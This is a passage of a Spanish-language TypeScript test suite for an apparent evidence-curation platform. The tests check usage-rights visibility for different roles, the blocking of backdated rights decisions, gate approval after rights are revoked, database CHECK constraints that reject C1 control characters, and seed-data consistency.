    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Entrevista con transcripción pegada',
      contenido: 'TRANSCRIPCIÓN LITERAL: me negué a darles la foto de mi cédula.',
      tipoFuente: 'entrevista',
      referencia: 'grabaciones/E-020',
    });
    await adjuntarArchivo(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      nombre: 'transcripcion.pdf',
      tipoMime: 'application/pdf',
      contenidoBase64: bytesABase64(PDF),
    });
    const curada = await aprobarItem(leadId, {
      workspaceId: ws,
      itemId: item.itemId,
      esEstadoActual: false,
      resumen: 'Vivencia del abandono',
      dimensiones,
    });

    // Derechos PENDIENTES: el stakeholder no recibe el material por ninguna vía.
    expect(await contenidoDeItem(stakeId, ws, item.itemId)).toBeNull();
    const bandejaStake = await listarBandeja(stakeId, ws);
    expect(bandejaStake.decididas.some((i) => i.id === item.itemId)).toBe(false);
    // La boutique sí, que es lo que autoriza el ámbito interno y sin lo cual no se cura.
    expect(await contenidoDeItem(disenadorId, ws, item.itemId)).toContain('TRANSCRIPCIÓN');
    // Y admin-cliente también: administra los datos y exporta el archivo completo (SYS-04).
    expect(await contenidoDeItem(adminClienteId, ws, item.itemId)).toContain('TRANSCRIPCIÓN');

    // El fragmento de una cita es texto copiado del original: mismo predicado.
    const ins = await crearInsight(leadId, {
      workspaceId: ws,
      titulo: 'La verificación expulsa',
      resumen: '',
    });
    const af = await agregarAfirmacion(leadId, {
      workspaceId: ws,
      insightId: ins.insightId,
      texto: 'El documento es el punto de fuga',
      esHipotesis: false,
    });
    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: curada.evidenciaId,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Consentimiento firmado',
      venceEn: null,
    });
    await agregarCita(leadId, {
      workspaceId: ws,
      afirmacionId: af.afirmacionId,
      evidenciaId: curada.evidenciaId,
      fragmento: 'me negué a darles la foto de mi cédula',
      localizacion: 'min 12:04',
    });
    // Con derechos vigentes el stakeholder ve el fragmento: no se le oculta el trabajo,
    // se le oculta el material que todavía no está autorizado para él.
    const conDerechos = await conUsuario(stakeId, (tx) => tx`select fragmento from cita
      where afirmacion_id = ${af.afirmacionId}`);
    expect(conDerechos).toHaveLength(1);

    // Se revoca. El fragmento ya copiado deja de ser legible para quien no tiene el uso.
    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: curada.evidenciaId,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    const trasRevocar = await conUsuario(stakeId, (tx) => tx`select fragmento from cita
      where afirmacion_id = ${af.afirmacionId}`);
    expect(trasRevocar).toHaveLength(0);
    // La boutique sigue viéndolo: es su material de trabajo.
    const paraCurador = await conUsuario(disenadorId, (tx) => tx`select fragmento from cita
      where afirmacion_id = ${af.afirmacionId}`);
    expect(paraCurador).toHaveLength(1);

    // Y la IDENTIDAD de la evidencia sigue siendo visible para el stakeholder: sin eso no
    // se puede explicar el bloqueo, que es lo que SYS-14 exige.
    const visible = await conUsuario(stakeId, (tx) => tx`select titulo from evidencia
      where id = ${curada.evidenciaId}`);
    expect(visible).toHaveLength(1);
  });

  it('el sello de la decisión de derechos no lo puede escribir el caller', async () => {
    // `decidido_en` salió del grant de UPDATE: lo fija el guard de la transición. Sin eso,
    // un UPDATE directo podía retro o post-datar cuándo se concedieron unos derechos.
    await expect(
      conUsuario(leadId, (tx) => tx`update derecho_uso
        set decidido_en = now() - interval '30 days'
        where evidencia_id = ${evConDerechos} and workspace_id = ${ws}`),
    ).rejects.toMatchObject({ code: '42501' });
  });

  it('G2 no se aprueba con un arquetipo cuyo respaldo perdió los derechos (eje TIEMPO)', async () => {
    // Un trigger de ENLACE comprueba al escribir y no vuelve a correr. Confirmar un
    // arquetipo exige evidencia enlazada, pero eso se comprobó al confirmarlo: entre aquel
    // momento y la aprobación de G2 —que ocurre con el cliente delante— pueden revocarse
    // los derechos, y el perfil deja de sostenerse sin que nada lo mire. Es el mismo
    // agujero temporal que ya se cerró para los ítems de checklist, en el último sitio
    // donde un gate consume respaldo sin re-comprobarlo.
    const admin = sqlAdmin();
    const [fuente] = await admin`insert into fuente (workspace_id, tipo, titulo, creado_por)
      values (${ws}, 'nota', 'Fuente del arquetipo', ${leadId}) returning id`;
    const [ev] = await admin`insert into evidencia
      (workspace_id, fuente_id, titulo, dimensiones, creado_por)
      values (${ws}, ${fuente!.id as string}, 'Perfil observado', '{}'::jsonb, ${leadId})
      returning id`;
    const evPerfil = ev!.id as string;
    await admin`insert into derecho_uso
      (workspace_id, evidencia_id, estado, ambito, base, decidido_por, decidido_en, creado_por)
      values (${ws}, ${evPerfil}, 'concedido', 'cliente', 'Consentimiento vigente',
              ${leadId}, now(), ${leadId})`;

    const [proy] = await admin`insert into proyecto (workspace_id, reto_id, codigo, titulo, creado_por)
      values (${ws}, ${retoId}, 'P-94', 'Proyecto arquetipo', ${leadId}) returning id`;
    const proyectoId = proy!.id as string;
    await admin`insert into etapa_instancia (workspace_id, proyecto_id, numero, nombre)
      values (${ws}, ${proyectoId}, 2, 'Análisis y entendimiento')`;
    const [gate] = await admin`insert into gate_instancia
      (workspace_id, proyecto_id, numero, rol_aprobador)
      values (${ws}, ${proyectoId}, 2, 'lead-boutique') returning id`;
    const gateId = gate!.id as string;
    const [ci] = await admin`insert into checklist_item (workspace_id, gate_id, orden, texto)
      values (${ws}, ${gateId}, 0, 'Arquetipos resueltos') returning id`;
    await marcarItem(leadId, {
      workspaceId: ws,
      itemId: ci!.id as string,
      accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: evConDerechos },
    });
    // Arquetipo CONFIRMADO con su evidencia: el veredicto se emitió cuando los derechos
    // estaban vigentes, que es justo la premisa del agujero.
    const [arq] = await admin`insert into arquetipo
      (workspace_id, reto_id, nombre, estado, veredicto_razon, creado_por)
      values (${ws}, ${retoId}, ${'Perfil ' + marca}, 'confirmado', 'Encaja con lo observado', ${leadId})
      returning id`;
    await admin`insert into arquetipo_evidencia (workspace_id, arquetipo_id, evidencia_id)
      values (${ws}, ${arq!.id as string}, ${evPerfil})`;

    await decidirDerechos(adminClienteId, {
      workspaceId: ws,
      evidenciaId: evPerfil,
      decision: 'denegado',
      ambito: 'interno',
      base: 'El titular retiró el consentimiento',
      venceEn: null,
    });
    // El arquetipo sigue CONFIRMADO y sin hipótesis pendientes: la regla que ya existía
    // («no quedan arquetipos por resolver») no ve nada raro. Lo que falla es el respaldo.
    const [estado] = await conUsuario(leadId, (tx) => tx`select estado from arquetipo
      where id = ${arq!.id as string}`);
    expect(estado!.estado).toBe('confirmado');
    await expect(aprobarGate(leadId, { workspaceId: ws, gateId })).rejects.toThrow(
      /arquetipo confirmado ya no tiene ninguna evidencia con derechos vigentes/,
    );

    await decidirDerechos(leadId, {
      workspaceId: ws,
      evidenciaId: evPerfil,
      decision: 'concedido',
      ambito: 'cliente',
      base: 'Nuevo consentimiento firmado',
      venceEn: null,
    });
    const r = await aprobarGate(leadId, { workspaceId: ws, gateId });
    expect(r.numero).toBe(2);
  });

  // ── Higiene de la migración y del seed ──

  it('los CHECK de sanitización rigen desde ya y quedan VALIDADOS en una base limpia', async () => {
    // Se añaden NOT VALID —el esquema anterior y el validador de la app aceptaban esos
    // caracteres, así que una instalación con material heredado sucio no puede caerse al
    // desplegar— y se validan acto seguido si no hay deuda. Las dos mitades importan: que
    // una base limpia acabe en el estado FUERTE (convalidated = t, la restricción cubre
    // también el pasado) y que, validada o no, rija para toda escritura nueva.
    const admin = sqlAdmin();
    const filas = await admin`select conname, convalidated from pg_constraint
      where conrelid = 'item_importacion'::regclass
        and conname in ('item_contenido_limpio', 'item_titulo_limpio', 'item_referencia_limpia')
      order by conname`;
    expect(filas.map((f) => f.conname as string)).toEqual([
      'item_contenido_limpio',
      'item_referencia_limpia',
      'item_titulo_limpio',
    ]);
    expect(filas.map((f) => f.convalidated as boolean)).toEqual([true, true, true]);
    // (La mitad «rige para escrituras nuevas» la cubre el test de controles y bidi por
    // SQL crudo, que sigue chocando con 23514.)
  });

  it('el CHECK de la base rechaza el bloque C1 entero, igual que el validador de la app', async () => {
    // Los dos predicados son espejo: si divergen, el respaldo del esquema deja de serlo.
    // Se recorre TODO U+0080-U+009F contra la función de la base, que es lo que ejecuta el
    // CHECK, y se comprueba de paso que el vecindario (U+00A0 en adelante) sigue siendo
    // texto legítimo — un predicado demasiado ancho rompería material real.
    const admin = sqlAdmin();
    const [veredicto] = await admin`select
      bool_and(not texto_importado_limpio('hola' || chr(g) || 'mundo')) as c1_rechazado,
      texto_importado_limpio('espacio ' || chr(160) || 'duro y acentos áéí') as vecino_ok
      from generate_series(128, 159) g`;
    expect(veredicto!.c1_rechazado).toBe(true);
    expect(veredicto!.vecino_ok).toBe(true);

    // Y por SQL CRUDO del rol de aplicación: NEL en el contenido y CSI en el título
    // chocan con el CHECK, que es donde la promesa deja de depender de la app.
    const item = await crearItem(leadId, {
      workspaceId: ws,
      titulo: 'Base para el check C1',
      contenido: 'limpio',
      tipoFuente: 'nota',
      referencia: '',
    });
    expect(item.itemId).toBeTruthy();
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con NEL', 'hola' || chr(133) || 'mundo', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
    await expect(
      conUsuario(leadId, (tx) => tx`insert into item_importacion
        (workspace_id, titulo, contenido, tipo_fuente, creado_por)
        values (${ws}, 'con CSI ' || chr(155), 'texto', 'nota', ${leadId})`),
    ).rejects.toMatchObject({ code: '23514' });
  });

  it('el seed no deja evidencia sin registro de derechos (el guard se lo salta, la regla no)', async () => {
    // El seed corre como PROPIETARIO, así que el pre-chequeo anti-oráculo de
    // `evidencia_con_derechos_guard` sale antes y no verifica nada. Eso es correcto —el
    // guard no puede ser un oráculo— pero significa que la disciplina la tiene que poner
    // el seed: una evidencia sembrada sin fila de derechos sale bloqueada por «no tiene
    // registro» y NO se puede reparar desde el producto, porque decidirDerechos solo hace
    // UPDATE y no hay fila que actualizar.
    const admin = sqlAdmin();
    const [total] = await admin`select count(*)::int as n from evidencia e
      join workspace w on w.id = e.workspace_id
      where w.nombre in ('Banco Andino', 'Clínica del Valle')`;
    // No vacuo: si esto es 0 la base no está sembrada y la aserción siguiente no probaría
    // nada (CI siembra antes de correr la suite, igual que el flujo de validación local).
    expect(total!.n as number).toBeGreaterThan(0);
    const huerfanas = await admin`select e.id, e.titulo from evidencia e
      join workspace w on w.id = e.workspace_id
      where w.nombre in ('Banco Andino', 'Clínica del Valle')
        and not exists (select 1 from derecho_uso d where d.evidencia_id = e.id)`;
    expect(huerfanas.map((f) => f.titulo as string)).toEqual([]);
  });

  it('marcar cumplido sin evidencia sigue siendo imposible (el guard no lo relaja)', async () => {
    await expect(
      marcarItem(leadId, {
        workspaceId: ws,
        itemId: itemChecklist,
        accion: { tipo: 'cumplido', objetoClase: 'evidencia', objetoId: crypto.randomUUID() },
      }),
    ).rejects.toThrow(ErrorMetodo);
  });
});
